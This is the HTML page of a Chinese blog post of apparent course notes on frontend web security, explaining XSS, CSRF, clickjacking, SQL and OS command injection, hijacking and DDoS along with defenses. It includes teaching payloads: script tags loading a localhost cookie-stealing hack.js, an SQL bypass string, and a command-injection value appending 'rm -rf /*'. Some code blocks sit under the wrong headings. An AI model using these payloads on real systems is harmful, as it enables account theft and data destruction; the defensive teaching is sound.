@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>前端安全 | 前端笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="MinHow,MinHow's Blog">
+  
+  <meta name="description" content="常⻅Web攻击⼀、课前准备⼆、课堂主题三、课堂⽬标XSSCSRF点击劫持SQL注⼊OS注⼊请求劫持DDOS四、知识要点1、XSSCross Site Scripting跨站脚本攻击XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web⽹站注册⽤户的浏览器内运⾏⾮法的HTML标签或JavaScript进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全">
+<meta property="og:url" content="https://luhu9012.github.io/2019/08/12/security/index.html">
+<meta property="og:site_name" content="前端笔记">
+<meta property="og:description" content="常⻅Web攻击⼀、课前准备⼆、课堂主题三、课堂⽬标XSSCSRF点击劫持SQL注⼊OS注⼊请求劫持DDOS四、知识要点1、XSSCross Site Scripting跨站脚本攻击XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web⽹站注册⽤户的浏览器内运⾏⾮法的HTML标签或JavaScript进">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-05-13T09:05:50.802Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="前端安全">
+<meta name="twitter:description" content="常⻅Web攻击⼀、课前准备⼆、课堂主题三、课堂⽬标XSSCSRF点击劫持SQL注⼊OS注⼊请求劫持DDOS四、知识要点1、XSSCross Site Scripting跨站脚本攻击XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web⽹站注册⽤户的浏览器内运⾏⾮法的HTML标签或JavaScript进">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">MinHow&#39;s Blog</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a  href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a  href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a  href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        MinHow&#39;s Blog
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                    <h3>
+                        一个专注 WEB 开发的技术博客
+                    </h3>
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="MinHow" target="_blank" href="//minhow.com">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="//github.com/wongminho">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                        <a title="Weibo" target="_blank" href="//weibo.com/WongMinHo">
+                            <i class="fa fa-weibo fa-2x"></i></a>
+                    
+                        <a title="Twitter" target="_blank" href="//twitter.com/huangminhow">
+                            <i class="fa fa-twitter fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-security" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      前端安全
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-08-12
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <p>常⻅Web攻击<br>⼀、课前准备<br>⼆、课堂主题<br>三、课堂⽬标<br>XSS<br>CSRF<br>点击劫持<br>SQL注⼊<br>OS注⼊<br>请求劫持<br>DDOS<br>四、知识要点<br>1、XSS<br>Cross Site Scripting<br>跨站脚本攻击<br>XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本<br>攻击是指通过存在安全漏洞的Web⽹站注册⽤户的浏览器内运⾏⾮法的HTML标签或JavaScript<br>进⾏的⼀种攻击。<br>跨站脚本攻击有可能造成以下影响:<br>利⽤虚假输⼊表单骗取⽤户个⼈信息。<br>利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。<br>显示伪造的⽂章或图⽚。<br>XSS攻击分类<br>反射型 - url参数直接注⼊<br>// 普通<br><a href="http://localhost:3000/?from=china" target="_blank" rel="noopener">http://localhost:3000/?from=china</a><br>// alert尝试<br><a href="http://localhost:3000/?from=" target="_blank" rel="noopener">http://localhost:3000/?from=</a><script>alert(3)</script><br>开课吧web全栈架构师<br>存储型 - 存储到DB后读取时注⼊<br>XSS攻击的危害 - Scripting能⼲啥就能⼲啥<br>获取⻚⾯数据<br>获取Cookies<br>劫持前端逻辑<br>发送请求<br>偷取⽹站的任意数据<br>偷取⽤户的资料<br>偷取⽤户的秘密和登录态<br>欺骗⽤户<br>防范⼿段<br>ejs转义⼩知识</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HEAD</span><br><span class="line">0 禁⽌XSS过滤。</span><br><span class="line">// 获取Cookie</span><br><span class="line">http://localhost:3000/?from=&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// 短域名伪造 https://dwz.cn/</span><br><span class="line">// 伪造cookie⼊侵 chrome</span><br><span class="line">document.cookie=&quot;kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjox</span><br><span class="line">NTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0=&quot;</span><br><span class="line">// 评论</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">// 跨站脚本注⼊</span><br><span class="line">我来了&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;% code %&gt;⽤于执⾏其中javascript代码；</span><br><span class="line">&lt;%= code %&gt;会对code进⾏html转义；</span><br><span class="line">&lt;%- code %&gt;将不会进⾏转义</span><br><span class="line">ctx.set(&apos;X-XSS-Protection&apos;, 0) // 禁⽌XSS过滤</span><br><span class="line">// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; 可以拦截 但伪装⼀下就</span><br><span class="line">不⾏了</span><br></pre></td></tr></table></figure>
+
+<p>开课吧web全栈架构师<br>1 启⽤XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除⻚⾯（删除<br>不安全的部分）。<br>1;mode=block 启⽤XSS过滤。 如果检测到攻击，浏览器将不会清除⻚⾯，⽽是阻⽌⻚⾯加载。<br>1; report= (Chromium only)<br>启⽤XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的<br>功能发送违规报告。<br>CSP<br>内容安全策略 (CSP, Content Security Policy) 是⼀个附加的安全层，⽤于帮助检测和缓解<br>某些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃<br>取到⽹站破坏或作为恶意软件分发版本等⽤途。<br>CSP 本质上就是建⽴⽩名单，开发者明确告诉浏览器哪些外部资源可以加载和执⾏。我们<br>只需要配置规则，如何拦截是由浏览器⾃⼰实现的。我们可以通过这种⽅式来尽量减少<br>XSS 攻击。<br>转义字符<br>⿊名单<br>⽤户的输⼊永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜<br>杠进⾏转义<br>富⽂本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。<br>对于这种情况，通常采⽤⽩名单过滤的办法，当然也可以通过⿊名单过滤，但是考虑到需要过<br>滤的标签和标签属性实在太多，更加推荐使⽤⽩名单的⽅式。<br>⽩名单<br>HttpOnly Cookie<br>这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将<br>其属性设为HttpOnly，就可以避免该⽹⻚的cookie被客户端恶意JavaScript窃取，保护⽤<br>户cookie信息。<br>2、CSRF<br>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀种常⻅的Web攻击，它利⽤⽤户已<br>登录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作。<br>⽤户已经登录了站点 A，并在本地记录了 cookie<br>在⽤户没有登出站点 A 的情况下（也就是 cookie ⽣效的情况下），访问了恶意攻击者提供的引<br>诱危险站点 B (B 站点要求访问站点A)。<br>站点 A 没有做任何 CSRF 防御<br>response.addHeader(“Set-Cookie”, “uid=112; Path=/; HttpOnly”)<br>登录 <a href="http://localhost:4000/csrf.html" target="_blank" rel="noopener">http://localhost:4000/csrf.html</a><br>开课吧web全栈架构师<br>CSRF攻击危害<br>利⽤⽤户登录态<br>⽤户不知情<br>完成业务请求<br>盗取⽤户资⾦（转账，消费）<br>冒充⽤户发帖背锅<br>损害⽹站声誉<br>防御<br>禁⽌第三⽅⽹站带Cookie - 有兼容性问题<br>Referer Check - Https不发送referer<br>验证码<br>3、点击劫持 - clickjacking<br>点击劫持是⼀种视觉欺骗的攻击⼿段。攻击者将需要攻击的⽹站通过 iframe 嵌套的⽅式嵌⼊⾃<br>⼰的⽹⻚中，并将 iframe 设置为透明，在⻚⾯中透出⼀个按钮诱导⽤户点击。<br>防御<br>X-FRAME-OPTIONS<br>X-FRAME-OPTIONS 是⼀个 HTTP 响应头，在现代浏览器有⼀个很好的⽀持。这个 HTTP 响应头<br>就是为了防御⽤ iframe 嵌套的点击劫持攻击。<br>该响应头有三个值可选，分别是<br>DENY，表示⻚⾯不允许通过 iframe 的⽅式展示<br>SAMEORIGIN，表示⻚⾯可以在相同域名下通过 iframe 的⽅式展示<br>ALLOW-FROM，表示⻚⾯可以在指定来源的 iframe 中展示<br>JS⽅式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 登录</span><br><span class="line">http://localhost:4000/clickjacking.html</span><br><span class="line"></span><br><span class="line"> ctx.set(&apos;X-FRAME-OPTIONS&apos;, &apos;DENY&apos;)</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;style id=&quot;click-jack&quot;&gt;</span><br><span class="line"> html &#123;</span><br><span class="line"> display: none !important;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>开课吧web全栈架构师<br>以上代码的作⽤就是当通过 iframe 的⽅式加载⻚⾯时，攻击者的⽹⻚直接不显示所有内容了。<br>SQL注⼊<br>防御<br>所有的查询语句建议使⽤数据库提供的参数化查询接⼝<strong>，参数化的语句使⽤参数⽽不是将⽤户<br>输⼊变量嵌⼊到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的<br>query ⽅法中的 ? 占位参数。<br>严格限制Web应⽤的数据库的操作权限</strong>，给此⽤户提供仅仅能够满⾜其⼯作的最低权限，从⽽<br>最⼤限度的减少注⼊攻击对数据库的危害<br>后端代码检查输⼊的数据是否符合预期<strong>，严格限制变量的类型，例如使⽤正则表达式进⾏⼀些<br>匹配处理。<br>对进⼊数据库的特殊字符（’，”，\，&lt;，&gt;，&amp;，*，; 等）进⾏转义处理，或编码转换</strong>。基本上<br>所有的后端语⾔都有对字符串进⾏转义处理的⽅法，⽐如 lodash 的 lodash._escapehtmlchar<br>库。<br>OS命令注⼊</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> if (self == top) &#123;</span><br><span class="line"> var style = document.getElementById(&apos;click-jack&apos;)</span><br><span class="line"> document.body.removeChild(style)</span><br><span class="line"> &#125; else &#123;</span><br><span class="line"> top.location = self.location</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>// 填⼊特殊密码<br>1’or’1’=’1<br>// 拼接后的SQL<br>SELECT *<br>FROM test.user<br>WHERE username = ‘laowang’<br>AND password = ‘1’or’1’=’1’<br>OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。<br>OS命令注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数<br>的地⽅就有存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。<br>开课吧web全栈架构师<br>如果传⼊的参数是会怎样<br>请求劫持<br>DNS劫持<br>顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期<br>的ip<br>HTTP劫持 运营商劫持，此时⼤概只能升级HTTPS了<br>DDOS<br><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/06/ddos.html</a> 阮⼀峰<br>distributed denial of service<br>DDOS 不是⼀种攻击，⽽是⼀⼤类攻击的总称。它有⼏⼗种类型，新的攻击⽅法还在不断发明出来。<br>⽹站运⾏的各个环节，都可以是攻击⽬标。只要把⼀个环节攻破，使得整个流程跑不起来，就达到了<br>瘫痪服务的⽬的。<br>其中，⽐较常⻅的⼀种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承<br>受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤概20多个 IP 地址轮流发出请求，每个<br>地址的请求量在每秒200次~300次。我看访问⽇志的时候，就觉得那些请求像洪⽔⼀样涌来，⼀眨眼<br>就是⼀⼤堆，⼏分钟的时间，⽇志⽂件的体积就⼤了100MB。说实话，这只能算⼩攻击，但是我的个<br>⼈⽹站没有任何防护，服务器还是跟其他⼈共享的，这种流量⼀来⽴刻就下线了。<br>防御⼿段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo</span><br><span class="line">const exec = require(&apos;mz/child_process&apos;).exec;</span><br><span class="line">let params = &#123;/* ⽤户输⼊的参数 */&#125;;</span><br><span class="line">exec(`git clone $&#123;params.repo&#125; /some/path`);</span><br><span class="line">https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>备份⽹站<br>备份⽹站不⼀定是全功能的，如果能做到全静态浏览，就能满⾜需求。最低限度应该可以显示公<br>告，告诉⽤户，⽹站出了问题，正在全⼒抢修。</li>
+<li>HTTP 请求的拦截<br>硬件 服务器 防⽕墙</li>
+<li>带宽扩容 + CDN<br>提⾼犯罪成本</li>
+</ul>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2020年05月13日 17:05</p>
+        <p>原始链接： <a class="post-url" href="/2019/08/12/security/" title="前端安全">https://luhu9012.github.io/2019/08/12/security/</a></p>
+        <footer>
+            <a href="https://luhu9012.github.io">
+                <img src="/images/logo.png" alt="luhu9012">
+                luhu9012
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;">赏</a>
+</div>
+
+<div id="reward" class="post-modal reward-lay">
+    <a class="close" href="javascript:;" id="reward-close">×</a>
+    <span class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我吃糖~
+        <i class="icon icon-quote-right"></i>
+    </span>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/images/wechat_code.jpg" alt="打赏二维码">
+        </div>
+        <div class="reward-select">
+            
+            <label class="reward-select-item checked" data-id="wechat" data-wechat="/images/wechat_code.jpg">
+                <img class="reward-select-item-wechat" src="/images/wechat.png" alt="微信">
+            </label>
+            
+            
+            <label class="reward-select-item" data-id="alipay" data-alipay="/images/alipay_code.jpg">
+                <img class="reward-select-item-alipay" src="/images/alipay.png" alt="支付宝">
+            </label>
+            
+        </div>
+    </div>
+</div>
+
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://luhu9012.github.io/2019/08/12/security/&title=《前端安全》 — 前端笔记&pic=https://luhu9012.github.ioimages/logo.png" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://luhu9012.github.io/2019/08/12/security/&title=《前端安全》 — 前端笔记&source=" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://luhu9012.github.io/2019/08/12/security/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《前端安全》 — 前端笔记&url=https://luhu9012.github.io/2019/08/12/security/&via=https://luhu9012.github.io" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://luhu9012.github.io/2019/08/12/security/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://luhu9012.github.io/2019/08/12/security/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2020/05/13/others/" id="article-nav-newer" class="article-nav-link-wrap">
+
+      <span class="article-nav-title">
+        <i class="fa fa-hand-o-left" aria-hidden="true"></i>
+        
+          对象检测
+        
+      </span>
+    </a>
+  
+  
+    <a href="/2019/08/10/interview/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">interview</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2020 luhu9012<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "https://luhu9012.github.io",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 1
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/bom/">bom</a><a class="category-link" href="/categories/css/">css</a><a class="category-link" href="/categories/es6/">es6</a><a class="category-link" href="/categories/js实践/">js实践</a><a class="category-link" href="/categories/框架/">框架</a><a class="category-link" href="/categories/设计模式/">设计模式</a><a class="category-link" href="/categories/项目/">项目</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/bfc/" style="font-size: 10px;">bfc</a> <a href="/tags/es6-aync/" style="font-size: 10px;">es6 aync</a> <a href="/tags/es6-语法/" style="font-size: 10px;">es6 语法</a> <a href="/tags/javaSciript/" style="font-size: 20px;">javaSciript</a> <a href="/tags/js-函数/" style="font-size: 10px;">js 函数</a> <a href="/tags/js-机制/" style="font-size: 10px;">js 机制</a> <a href="/tags/js基础-js运行机制/" style="font-size: 10px;">js基础 js运行机制</a> <a href="/tags/oop/" style="font-size: 10px;">oop</a> <a href="/tags/vue-js/" style="font-size: 10px;">vue.js</a> <a href="/tags/垂直居中/" style="font-size: 10px;">垂直居中</a> <a href="/tags/性能/" style="font-size: 16.67px;">性能</a> <a href="/tags/文件上传/" style="font-size: 13.33px;">文件上传</a> <a href="/tags/树/" style="font-size: 10px;">树</a> <a href="/tags/跨域/" style="font-size: 10px;">跨域</a> <a href="/tags/项目/" style="font-size: 13.33px;">项目</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a  href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a  href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a  href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/bfc/" style="font-size: 10px;">bfc</a> <a href="/tags/es6-aync/" style="font-size: 10px;">es6 aync</a> <a href="/tags/es6-语法/" style="font-size: 10px;">es6 语法</a> <a href="/tags/javaSciript/" style="font-size: 20px;">javaSciript</a> <a href="/tags/js-函数/" style="font-size: 10px;">js 函数</a> <a href="/tags/js-机制/" style="font-size: 10px;">js 机制</a> <a href="/tags/js基础-js运行机制/" style="font-size: 10px;">js基础 js运行机制</a> <a href="/tags/oop/" style="font-size: 10px;">oop</a> <a href="/tags/vue-js/" style="font-size: 10px;">vue.js</a> <a href="/tags/垂直居中/" style="font-size: 10px;">垂直居中</a> <a href="/tags/性能/" style="font-size: 16.67px;">性能</a> <a href="/tags/文件上传/" style="font-size: 13.33px;">文件上传</a> <a href="/tags/树/" style="font-size: 10px;">树</a> <a href="/tags/跨域/" style="font-size: 10px;">跨域</a> <a href="/tags/项目/" style="font-size: 13.33px;">项目</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
